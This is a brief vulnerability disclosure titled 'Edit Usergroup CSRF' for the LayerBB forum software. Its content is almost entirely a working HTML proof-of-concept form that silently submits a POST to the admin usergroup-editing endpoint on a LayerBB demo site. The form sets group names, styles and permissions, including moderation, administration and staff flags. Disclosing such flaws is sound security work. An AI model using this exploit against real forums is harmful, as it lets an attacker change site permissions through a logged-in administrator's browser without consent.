# Edit Usergroup CSRF
Allows for the usergroup to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="https://demo.layerbb.com/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="https://demo.layerbb.com/admin/edit_usergroup.php/id/1" method="POST" style="padding: 25px;">
    <label for="g_name">Name</label>
    <input type="text" name="g_name" id="g_name" value="User" class="form-control">
    <label for="g_style">Style <small><code>%username%</code> will be replaced with the user's username.</small></label>
    <textarea name="g_style" id="g_style" class="form-control">&lt;span&gt;%username%&lt;/span&gt;</textarea>
    <label for="b_style_s">Banner Style Start</label>
    <textarea name="b_style_s" id="b_style_s" class="form-control">&lt;span class="label label -default"&gt;</textarea>
    <label for="b_style_e">Banner Style End</label>
    <textarea name="b_style_e" id="b_style_e" class="form-control">&lt;/span&gt;</textarea>
    <label for="permissions">Permissions</label><br>
    <input type="checkbox" name="permissions[]" value="1" checked=""> view_forum<br><input type="checkbox" name="permissions[]" value="2" checked=""> create_thread<br><input type="checkbox" name="permissions[]" value="3" checked=""> reply_thread<br><input type="checkbox" name="permissions[]" value="4"> access_moderation<br><input type="checkbox" name="permissions[]" value="5"> access_administration<br>
    <br>
    <input type="checkbox" name="is_staff" value="1"> This Usergroup is staff.
    <br>
    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
</form>
```
